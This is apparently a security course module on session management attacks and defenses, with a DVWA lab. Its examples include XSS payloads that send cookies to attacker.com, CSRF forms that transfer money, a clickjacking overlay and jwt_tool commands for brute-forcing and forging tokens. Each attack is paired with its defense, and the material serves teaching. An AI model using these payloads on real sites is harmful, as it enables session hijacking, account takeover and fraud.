# Session Management Attacks

## Hijacking and Manipulating User Sessions

---

## How Sessions Work

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="230" viewBox="0 0 660 230">
  <defs>
    <marker id="arr" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#555"/>
    </marker>
  </defs>
  <rect width="660" height="230" fill="#f0f4f8" rx="4" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="24" font-family="sans-serif" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">Session Management Flow</text>
  <!-- numbered steps top row -->
  <text x="30" y="50" font-family="sans-serif" font-size="12" fill="#333">1. User authenticates (login)</text>
  <text x="30" y="68" font-family="sans-serif" font-size="12" fill="#333">2. Server creates session and stores state</text>
  <text x="30" y="86" font-family="sans-serif" font-size="12" fill="#333">3. Server sends session ID to client (cookie)</text>
  <text x="30" y="104" font-family="sans-serif" font-size="12" fill="#333">4. Client sends session ID with every request</text>
  <text x="30" y="122" font-family="sans-serif" font-size="12" fill="#333">5. Server looks up session state using the ID</text>
  <text x="30" y="140" font-family="sans-serif" font-size="12" fill="#333">6. Session destroyed on logout or timeout</text>
  <!-- components -->
  <rect x="30" y="158" width="130" height="50" fill="#e3f2fd" rx="4" stroke="#1565c0" stroke-width="1.5"/>
  <text x="95" y="179" font-family="sans-serif" font-size="13" font-weight="bold" fill="#1565c0" text-anchor="middle">Client</text>
  <text x="95" y="197" font-family="sans-serif" font-size="11" fill="#555" text-anchor="middle">(Cookie Store)</text>
  <line x1="160" y1="183" x2="258" y2="183" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="210" y="176" font-family="sans-serif" font-size="10" fill="#333" text-anchor="middle">Session ID</text>
  <line x1="260" y1="192" x2="162" y2="192" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="210" y="207" font-family="sans-serif" font-size="10" fill="#333" text-anchor="middle">(Cookie)</text>
  <rect x="260" y="158" width="130" height="50" fill="#e8f5e9" rx="4" stroke="#2e7d32" stroke-width="1.5"/>
  <text x="325" y="179" font-family="sans-serif" font-size="13" font-weight="bold" fill="#2e7d32" text-anchor="middle">App Server</text>
  <line x1="390" y1="183" x2="488" y2="183" stroke="#555" stroke-width="1.5" marker-end="url(#arr)"/>
  <text x="440" y="176" font-family="sans-serif" font-size="10" fill="#333" text-anchor="middle">Session Data</text>
  <rect x="490" y="158" width="140" height="50" fill="#fff3e0" rx="4" stroke="#e65100" stroke-width="1.5"/>
  <text x="560" y="179" font-family="sans-serif" font-size="13" font-weight="bold" fill="#e65100" text-anchor="middle">Session Store</text>
  <text x="560" y="197" font-family="sans-serif" font-size="11" fill="#555" text-anchor="middle">(Memory/DB/Redis)</text>
</svg>

---

## Session Token Generation

```python
# VULNERABLE: Predictable session tokens
import hashlib
import time

def generate_session_bad():
    # Sequential counter
    return str(counter)                    # 1, 2, 3...

    # Timestamp-based
    return str(int(time.time()))           # 1705276800

    # MD5 of username
    return hashlib.md5(username.encode()).hexdigest()

# SECURE: Cryptographically random tokens
import secrets

def generate_session_good():
    return secrets.token_urlsafe(32)       # 43 chars of randomness
    # Example: "dGhpcyBpcyBhIHNlY3VyZSB0b2tlbg..."
    # 256 bits of entropy - practically unguessable
```

---

## Session Hijacking Techniques

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="295" viewBox="0 0 660 295">
  <rect width="660" height="295" fill="#f0f4f8" rx="4" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="24" font-family="sans-serif" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">Session Hijacking Attack Vectors</text>
  <!-- header -->
  <rect x="20" y="36" width="250" height="26" fill="#333" rx="2"/>
  <text x="145" y="53" font-family="sans-serif" font-size="13" font-weight="bold" fill="#fff" text-anchor="middle">Attack Vector</text>
  <rect x="275" y="36" width="365" height="26" fill="#333" rx="2"/>
  <text x="457" y="53" font-family="sans-serif" font-size="13" font-weight="bold" fill="#fff" text-anchor="middle">Method</text>
  <!-- rows -->
  <rect x="20" y="62" width="620" height="36" fill="#fff" rx="1" stroke="#ccc" stroke-width="1"/>
  <text x="30" y="82" font-family="sans-serif" font-size="12" fill="#1565c0" font-weight="bold">Network sniffing</text>
  <text x="285" y="82" font-family="sans-serif" font-size="12" fill="#222">Capture session cookie on unencrypted connection</text>
  <rect x="20" y="98" width="620" height="36" fill="#f9f9f9" rx="1" stroke="#ccc" stroke-width="1"/>
  <text x="30" y="118" font-family="sans-serif" font-size="12" fill="#c62828" font-weight="bold">XSS</text>
  <text x="285" y="118" font-family="sans-serif" font-size="12" fill="#222">Steal cookie via JavaScript: document.cookie</text>
  <rect x="20" y="134" width="620" height="36" fill="#fff" rx="1" stroke="#ccc" stroke-width="1"/>
  <text x="30" y="154" font-family="sans-serif" font-size="12" fill="#c62828" font-weight="bold">Session fixation</text>
  <text x="285" y="154" font-family="sans-serif" font-size="12" fill="#222">Force victim to use attacker's known session ID</text>
  <rect x="20" y="170" width="620" height="36" fill="#f9f9f9" rx="1" stroke="#ccc" stroke-width="1"/>
  <text x="30" y="190" font-family="sans-serif" font-size="12" fill="#c62828" font-weight="bold">CSRF</text>
  <text x="285" y="190" font-family="sans-serif" font-size="12" fill="#222">Ride on victim's existing authenticated session</text>
  <rect x="20" y="206" width="620" height="36" fill="#fff" rx="1" stroke="#ccc" stroke-width="1"/>
  <text x="30" y="226" font-family="sans-serif" font-size="12" fill="#c62828" font-weight="bold">Brute-force</text>
  <text x="285" y="226" font-family="sans-serif" font-size="12" fill="#222">Guess valid session tokens (if predictable)</text>
  <rect x="20" y="242" width="620" height="36" fill="#f9f9f9" rx="1" stroke="#ccc" stroke-width="1"/>
  <text x="30" y="262" font-family="sans-serif" font-size="12" fill="#c62828" font-weight="bold">Malware / Browser exploit</text>
  <text x="285" y="262" font-family="sans-serif" font-size="12" fill="#222">Steal cookies from browser cookie store</text>
  <line x1="275" y1="62" x2="275" y2="278" stroke="#aaa" stroke-width="1"/>
</svg>

---

## Session Hijacking via XSS

```javascript
// Attacker injects this via XSS vulnerability:

// Method 1: Redirect with cookie
<script>
document.location = 'https://attacker.com/steal?c='
    + document.cookie;
</script>

// Method 2: Hidden image request
<script>
new Image().src = 'https://attacker.com/steal?c='
    + document.cookie;
</script>

// Method 3: Fetch API (stealthier)
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
});
</script>

// Defense: HttpOnly flag prevents JavaScript access to cookies
```

---

## Session Fixation Attack

```misc
Attack flow:
1. Attacker gets a valid session ID from the server
   GET /login -> Set-Cookie: session=ATTACKER_SESSION

2. Attacker tricks victim into using this session
   <a href="https://target.com/login?session=ATTACKER_SESSION">
   Click here for a special offer</a>

3. Victim logs in with the attacker's session ID
   POST /login (Cookie: session=ATTACKER_SESSION)

4. Server authenticates victim on the SAME session
   The session is now authenticated

5. Attacker uses the session they already know
   GET /dashboard (Cookie: session=ATTACKER_SESSION)
   -> Attacker is now logged in as the victim!
```

---

## Session Fixation Prevention

```python
# VULNERABLE: Session ID not regenerated on login
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'],
                       request.form['password'])
    if user:
        session['user_id'] = user.id  # Same session ID!
        return redirect('/dashboard')

# SECURE: Regenerate session on login
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'],
                       request.form['password'])
    if user:
        # Destroy old session, create new one
        session.clear()
        session.regenerate()  # New session ID
        session['user_id'] = user.id
        return redirect('/dashboard')
```

---

## CSRF (Cross-Site Request Forgery)

```html
<!-- Attacker's website (evil.com) -->
<!-- Victim visits this page while logged into target.com -->

<!-- Method 1: Hidden form auto-submit -->
<form action="https://target.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>

<!-- Method 2: Image tag (GET-based CSRF) -->
<img src="https://target.com/transfer?to=attacker&amount=10000">

<!-- The victim's browser automatically includes
     the session cookie for target.com! -->
```

---

## CSRF Prevention

```python
# Method 1: CSRF tokens (synchronizer pattern)
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# In template:
<form method="POST">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <!-- form fields -->
</form>

# Method 2: SameSite cookie attribute
Set-Cookie: session=abc123; SameSite=Strict
# Strict: Never sent cross-site
# Lax: Sent on top-level GET navigations only
# None: Always sent (requires Secure flag)

# Method 3: Double-submit cookie
# Set CSRF token in both cookie AND form field
# Server verifies they match
```

---

## Session Token Analysis with Burp Sequencer

```misc
Steps to analyze session token quality:

1. In Burp, capture a request that returns a session token
2. Right-click -> Send to Sequencer
3. Configure the token location (cookie value)
4. Click "Start live capture"
5. Collect at least 10,000 tokens
6. Click "Analyze now"

Sequencer reports:
- Overall quality estimate
- Character-level analysis
- Bit-level analysis
- FIPS 140-2 compliance tests

Good tokens: "Excellent" quality, pass all tests
Bad tokens: Patterns detected, predictable bits
```

---

## Cookie Security Flags

```http
# Maximum security cookie configuration
Set-Cookie: session=abc123;
    Path=/;
    Domain=target.com;
    Secure;              # HTTPS only
    HttpOnly;            # No JavaScript access
    SameSite=Strict;     # No cross-site sending
    Max-Age=1800;        # 30 min expiry
    __Host-              # Cookie prefix (extra security)

# Cookie prefixes (modern browsers):
# __Secure- : Must have Secure flag
# __Host-   : Must have Secure, Path=/, no Domain
```

---

## Session Timeout Strategies

```python
# Idle timeout: Session expires after inactivity
IDLE_TIMEOUT = 30 * 60  # 30 minutes

# Absolute timeout: Session expires regardless of activity
ABSOLUTE_TIMEOUT = 8 * 60 * 60  # 8 hours

@app.before_request
def check_session_timeout():
    if 'user_id' in session:
        now = time.time()
        last_active = session.get('last_active', now)
        created = session.get('created', now)

        # Check idle timeout
        if now - last_active > IDLE_TIMEOUT:
            session.clear()
            return redirect('/login?reason=idle')

        # Check absolute timeout
        if now - created > ABSOLUTE_TIMEOUT:
            session.clear()
            return redirect('/login?reason=expired')

        session['last_active'] = now
```

---

## Secure Logout Implementation

```python
@app.route('/logout', methods=['POST'])  # POST, not GET!
def logout():
    # 1. Get session ID before clearing
    session_id = session.get('session_id')

    # 2. Remove session from server-side store
    if session_id:
        session_store.delete(session_id)

    # 3. Clear all session data
    session.clear()

    # 4. Invalidate the session cookie
    response = redirect('/login')
    response.set_cookie('session', '',
        expires=0,
        httponly=True,
        secure=True)

    # 5. (Optional) Add to token blacklist for JWT
    return response

# Note: Use POST to prevent CSRF-based logout
```

---

## JWT Session Security

```python
# Common JWT mistakes and fixes

# Mistake 1: Storing JWT in localStorage
# Fix: Use HttpOnly cookie

# Mistake 2: No token expiration
# Fix: Short-lived access tokens (15 min) + refresh tokens

# Mistake 3: No token revocation
# Fix: Token blacklist or short expiry + refresh rotation

# Mistake 4: Sensitive data in payload
# JWT payload is Base64-encoded, NOT encrypted!
# Never include: passwords, SSNs, credit cards

# Mistake 5: Weak signing secret
# Fix: Use RS256 with proper key management
# Or HS256 with 256+ bit random secret

import jwt
token = jwt.encode(
    {'user_id': 123, 'exp': datetime.utcnow() + timedelta(minutes=15)},
    SECRET_KEY, algorithm='HS256'
)
```

---

## Session Puzzling / Session Variable Overloading

```python
# Session puzzling occurs when multiple functions
# share the same session variable name

# Password reset flow sets session['user']
@app.route('/reset-password')
def reset_password():
    email = request.form['email']
    user = User.query.filter_by(email=email).first()
    session['user'] = user.username  # Stores username
    send_reset_email(user)
    return "Reset email sent"

# Authentication check uses session['user']
@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect('/login')
    # User is "authenticated" via session['user']
    return render_template('dashboard.html', user=session['user'])

# Attack: Submit password reset for admin -> session['user'] = 'admin'
# Navigate to /dashboard -> Authenticated as admin!

# Defense: Use different session keys for different purposes
# session['authenticated_user'] vs session['reset_user']
```

---

## Session Storage Comparison

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="260" viewBox="0 0 660 260">
  <rect width="660" height="260" fill="#f0f4f8" rx="4" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="24" font-family="sans-serif" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">Session Storage Options</text>
  <!-- header -->
  <rect x="20" y="38" width="100" height="26" fill="#333" rx="2"/>
  <text x="70" y="55" font-family="sans-serif" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Storage</text>
  <rect x="122" y="38" width="90" height="26" fill="#333" rx="2"/>
  <text x="167" y="55" font-family="sans-serif" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Security</text>
  <rect x="214" y="38" width="80" height="26" fill="#333" rx="2"/>
  <text x="254" y="55" font-family="sans-serif" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Scale</text>
  <rect x="296" y="38" width="80" height="26" fill="#333" rx="2"/>
  <text x="336" y="55" font-family="sans-serif" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Speed</text>
  <rect x="378" y="38" width="262" height="26" fill="#333" rx="2"/>
  <text x="509" y="55" font-family="sans-serif" font-size="12" font-weight="bold" fill="#fff" text-anchor="middle">Notes</text>
  <!-- data rows -->
  <rect x="20" y="64" width="620" height="26" fill="#fff" rx="1" stroke="#ddd" stroke-width="1"/>
  <text x="70" y="81" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">Memory</text>
  <text x="167" y="81" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Good</text>
  <text x="254" y="81" font-family="sans-serif" font-size="12" fill="#c62828" text-anchor="middle">Poor</text>
  <text x="336" y="81" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Fast</text>
  <text x="509" y="81" font-family="sans-serif" font-size="12" fill="#555" text-anchor="middle">Lost on restart</text>
  <rect x="20" y="90" width="620" height="26" fill="#f5f5f5" rx="1" stroke="#ddd" stroke-width="1"/>
  <text x="70" y="107" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">File</text>
  <text x="167" y="107" font-family="sans-serif" font-size="12" fill="#ff8f00" text-anchor="middle">Moderate</text>
  <text x="254" y="107" font-family="sans-serif" font-size="12" fill="#c62828" text-anchor="middle">Poor</text>
  <text x="336" y="107" font-family="sans-serif" font-size="12" fill="#ff8f00" text-anchor="middle">Moderate</text>
  <text x="509" y="107" font-family="sans-serif" font-size="12" fill="#555" text-anchor="middle">Disk I/O overhead</text>
  <rect x="20" y="116" width="620" height="26" fill="#fff" rx="1" stroke="#ddd" stroke-width="1"/>
  <text x="70" y="133" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">Database</text>
  <text x="167" y="133" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Good</text>
  <text x="254" y="133" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Good</text>
  <text x="336" y="133" font-family="sans-serif" font-size="12" fill="#ff8f00" text-anchor="middle">Moderate</text>
  <text x="509" y="133" font-family="sans-serif" font-size="12" fill="#555" text-anchor="middle">SQL query overhead</text>
  <rect x="20" y="142" width="620" height="26" fill="#e8f5e9" rx="1" stroke="#2e7d32" stroke-width="1.5"/>
  <text x="70" y="159" font-family="sans-serif" font-size="12" font-weight="bold" fill="#2e7d32" text-anchor="middle">Redis</text>
  <text x="167" y="159" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Good</text>
  <text x="254" y="159" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Great</text>
  <text x="336" y="159" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Fast</text>
  <text x="509" y="159" font-family="sans-serif" font-size="12" font-weight="bold" fill="#2e7d32" text-anchor="middle">★ Best option</text>
  <rect x="20" y="168" width="620" height="26" fill="#f5f5f5" rx="1" stroke="#ddd" stroke-width="1"/>
  <text x="70" y="185" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">Memcached</text>
  <text x="167" y="185" font-family="sans-serif" font-size="12" fill="#ff8f00" text-anchor="middle">Moderate</text>
  <text x="254" y="185" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Great</text>
  <text x="336" y="185" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Fast</text>
  <text x="509" y="185" font-family="sans-serif" font-size="12" fill="#555" text-anchor="middle">No persistence</text>
  <rect x="20" y="194" width="620" height="26" fill="#fff" rx="1" stroke="#ddd" stroke-width="1"/>
  <text x="70" y="211" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">JWT</text>
  <text x="167" y="211" font-family="sans-serif" font-size="12" fill="#ff8f00" text-anchor="middle">Varies</text>
  <text x="254" y="211" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Great</text>
  <text x="336" y="211" font-family="sans-serif" font-size="12" fill="#2e7d32" text-anchor="middle">Fast</text>
  <text x="509" y="211" font-family="sans-serif" font-size="12" fill="#555" text-anchor="middle">Stateless</text>
  <text x="330" y="248" font-family="sans-serif" font-size="11" fill="#2e7d32" text-anchor="middle">Best practice: Redis with encryption at rest — fast, TTL, cluster support, atomic operations</text>
</svg>

---

## Clickjacking Protection

```html
<!-- Clickjacking: Attacker overlays invisible iframe -->
<!-- Victim thinks they're clicking their page -->
<!-- Actually clicking on target.com in hidden iframe -->

<!-- Attacker's page: -->
<style>
  iframe {
    opacity: 0;       /* Invisible */
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 999;     /* On top */
  }
</style>
<iframe src="https://target.com/delete-account"></iframe>
<button>Click here to win a prize!</button>
<!-- User clicks "prize" button but actually clicks
     the delete-account button in the hidden iframe -->

<!-- Defense 1: X-Frame-Options header -->
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

<!-- Defense 2: CSP frame-ancestors -->
Content-Security-Policy: frame-ancestors 'none'

<!-- Defense 3: JavaScript frame-buster (fallback) -->
<script>if (top !== self) top.location = self.location;</script>
```

---

## JSON Web Token (JWT) Attack Toolkit

```bash
# jwt_tool - Swiss army knife for JWT testing

# Decode a JWT
python3 jwt_tool.py eyJhbGciOiJI...

# Test for known vulnerabilities
python3 jwt_tool.py eyJhbGciOiJI... -M at
# Tests: none algorithm, algorithm confusion, key confusion

# Tamper with claims
python3 jwt_tool.py eyJhbGciOiJI... -T
# Interactive mode to modify header/payload

# Brute-force the secret
python3 jwt_tool.py eyJhbGciOiJI... -C -d wordlist.txt

# Sign with known secret
python3 jwt_tool.py eyJhbGciOiJI... -S hs256 -p "secret_key"

# Common JWT claims to modify:
# "role": "user" -> "role": "admin"
# "sub": "123" -> "sub": "1"  (admin user)
# "exp": past -> "exp": far_future
# "iss": "" (empty issuer)
```

---

## Cookie Tossing Attack

```misc
Cookie Tossing: Set cookies from a subdomain
that override the parent domain's cookies

Attack scenario:
1. Attacker controls: evil.sub.target.com
2. Sets cookie: session=attacker_value; Domain=target.com
3. Victim visits target.com
4. Browser sends attacker's cookie
5. Victim uses attacker's session (session fixation)

Or:
1. Attacker controls: evil.sub.target.com
2. Sets cookie: csrf_token=known_value; Domain=target.com
3. Attacker can now predict victim's CSRF token
4. Perform CSRF attack with the known token

Defense:
- Use __Host- cookie prefix (prevents domain attribute)
- Validate cookies server-side
- Regenerate tokens after authentication
- Monitor for unexpected cookie sources
```

---

## Lab: Session Analysis

**Tasks**:

1. Log in to DVWA, capture session cookie
1. Analyze the `PHPSESSID` format
1. Test if session changes on login/logout
1. Check for `HttpOnly` and `Secure` flags
1. Test session fixation (set your own session ID)
1. Use Burp Sequencer to analyze token randomness

```bash
# Check cookie flags
curl -v http://localhost:8080/login.php 2>&1 | grep -i set-cookie
```

---

## Summary

- Session tokens must be cryptographically random
- Use `HttpOnly`, `Secure`, and `SameSite` cookie flags
- Regenerate session ID on authentication state changes
- Implement both idle and absolute session timeouts
- `CSRF` tokens prevent cross-site request forgery
- Proper logout must destroy server-side session data
- `JWT` tokens need short expiry and proper validation

> Next: SQL Injection Basics
